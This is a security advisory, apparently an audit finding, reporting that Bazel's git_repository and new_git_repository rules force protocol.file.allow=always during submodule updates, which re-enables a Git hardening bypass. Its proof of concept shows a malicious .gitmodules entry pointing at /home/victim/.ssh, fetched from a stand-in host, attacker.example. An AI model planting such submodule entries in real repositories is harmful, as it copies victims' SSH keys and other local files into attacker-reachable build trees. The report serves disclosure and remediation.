### Title
`git_repository`/`new_git_repository` force `protocol.file.allow=always`, letting a malicious `.gitmodules` in the fetched repo pull local files into the build - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
The bundled `git_repository`/`new_git_repository` Starlark repo rules call `git submodule update` with `-c protocol.file.allow=always` unconditionally whenever `init_submodules`/`recursive_init_submodules` is set. `protocol.file.allow` is a Git hardening control (default changed to `user`, i.e. disabled for submodule operations, starting with Git 2.38.1 specifically to stop repositories from using `.gitmodules` entries that reference local `file://`/bare local paths) which git added in response to real-world attacks where a malicious remote repository's `.gitmodules` names a submodule URL pointing at an arbitrary local path on the machine doing the clone, causing Git to "clone" (in fact hardlink/copy) content from that local path into the checkout. Bazel explicitly re-enables this behavior for every fetch that has submodules, regardless of who controls the remote repository content.

### Finding Description
`git_worker.bzl` builds submodule-update invocations here: [1](#0-0) 

Both the recursive and non-recursive branches pass `"-c", "protocol.file.allow=always"` to `git submodule update --init [--recursive] --checkout --force`. The comment justifying this documents that it is a deliberate override of Git's own hardening default, done purely to allow cloning from local directories (referencing bazelbuild/bazel#17040) — not to authenticate or scope the submodule URLs in any way. This command runs against a working tree that was just fetched from the attacker-controlled `remote` (see `_update`, which calls `init`, `add_origin`, `fetch`, `reset`, `clean`, then submodule update): [2](#0-1) 

The submodule URLs and paths used by `git submodule update` are read from `.gitmodules`, a file that is part of the fetched repository content — i.e., entirely attacker-controlled. Nothing in `git.bzl`/`git_worker.bzl` inspects or restricts submodule URLs (no allowlist of schemes/hosts, no check that a submodule URL resolves under the checkout directory). Git itself has scheme protections for `ext::`, `file://`, etc. (`protocol.<scheme>.allow`), and specifically added `protocol.file.allow=user` (disabled by default for automated/submodule operations) because an attacker who controls a repository's `.gitmodules` can point a submodule at an arbitrary local filesystem path (e.g. another checked-out repo, the user's home directory, cache/output-base paths) and have Git copy/hardlink its contents into the submodule directory during checkout. By forcing `protocol.file.allow=always`, Bazel disables exactly this protection for all `git_repository`/`new_git_repository` fetches that use submodules.

### Impact Explanation
An attacker who serves or otherwise causes a victim's build to fetch a Git repository via `git_repository`/`new_git_repository` with `init_submodules = True` (or `recursive_init_submodules = True`) can supply a `.gitmodules` entry with a submodule URL referencing a local path on the build machine (a bare/local Git repository at an absolute path, or a directory readable via `file://`). Git's submodule machinery will then copy content from that local path into the fetched external repository's checkout directory inside Bazel's external-repository content area. This is a read that crosses the intended repository boundary: content that should only ever come from the declared remote now can be sourced from anywhere readable on the build host and gets pulled into build inputs (and potentially into build outputs if referenced by a `BUILD` file, or exfiltrated by later steps of the untrusted repo's own build/patch scripts that read the copied files). This satisfies the "read outside the repository / exec root" bar, and is a direct re-introduction of the vulnerability class Git 2.38.1 patched with the `protocol.file.allow` default change.

### Likelihood Explanation
Any project using `git_repository`/`new_git_repository` with `init_submodules`/`recursive_init_submodules = True` against a remote that an attacker can influence (a compromised or maliciously-hosted mirror, a moved tag/branch, a repository accepting untrusted contributions that is later vendored) is affected with default Bazel flags — there is no opt-out or additional flag required; the override is unconditional in the rule implementation. `init_submodules`/`recursive_init_submodules` are common attributes used by real-world `WORKSPACE`/`MODULE.bazel` files for repos that vendor dependencies as submodules.

### Recommendation
Do not force `protocol.file.allow=always` for submodule updates driven by content originating from an untrusted remote. At minimum:
- Restrict submodule URL schemes to the remote's own scheme/host (validate submodule URLs before invoking `git submodule update`), or
- Only allow local-path submodules when `remote` itself is a local path (matching the original bug #17040 use case), rather than unconditionally for every `git_repository`, or
- Track upstream Git guidance and default to `protocol.file.allow=user`/`deny` unless the repository rule caller explicitly opts in with a dedicated attribute (documented as unsafe).

### Proof of Concept
1. Attacker prepares a Git repository `evil.git` whose `.gitmodules` contains:
   ```
   [submodule "leak"]
       path = leak
       url = /home/victim/.ssh
   ```
   (or `file:///home/victim/.ssh`), with a corresponding placeholder gitlink commit for the `leak` path.
2. Victim's `MODULE.bazel`/`WORKSPACE` uses:
   ```python
   git_repository(
       name = "evil",
       remote = "https://attacker.example/evil.git",
       commit = "<pinned commit>",
       init_submodules = True,
   )
   ```
3. During `bazel fetch @evil//...`, Bazel executes (per `update_submodules` in `tools/build_defs/repo/git_worker.bzl:210-217`):
   ```
   git -c protocol.file.allow=always submodule update --init --checkout --force
   ```
   Because `protocol.file.allow` is forced to `always`, Git honors the local-path submodule URL and copies the contents of `/home/victim/.ssh` into `external/evil/leak/`, where it becomes part of the fetched repo tree available to the rest of the build graph.
4. A `src/test/shell/bazel/starlark_git_repository_test.sh`-style integration test can codify this: create a local bare "victim" directory with a sentinel file, create a git repo with a submodule whose URL is that local path, fetch it via `git_repository(init_submodules = True)`, and assert the sentinel file's contents appear inside the resulting external repository — demonstrating the boundary read. (I was unable to find an existing regression test in `src/test/shell/bazel/starlark_git_repository_test.sh` that already covers submodule-URL restrictions, which is consistent with this not being guarded today.)

### Citations

**File:** tools/build_defs/repo/git_worker.bzl (L136-150)
```text
def _update(ctx, git_repo):
    ctx.delete(git_repo.directory)

    init(ctx, git_repo)
    add_origin(ctx, git_repo, ctx.attr.remote)
    fetch(ctx, git_repo)
    reset(ctx, git_repo)
    clean(ctx, git_repo)

    if git_repo.recursive_init_submodules:
        ctx.report_progress("Updating submodules recursively")
        update_submodules(ctx, git_repo, recursive = True)
    elif git_repo.init_submodules:
        ctx.report_progress("Updating submodules")
        update_submodules(ctx, git_repo)
```

**File:** tools/build_defs/repo/git_worker.bzl (L210-217)
```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
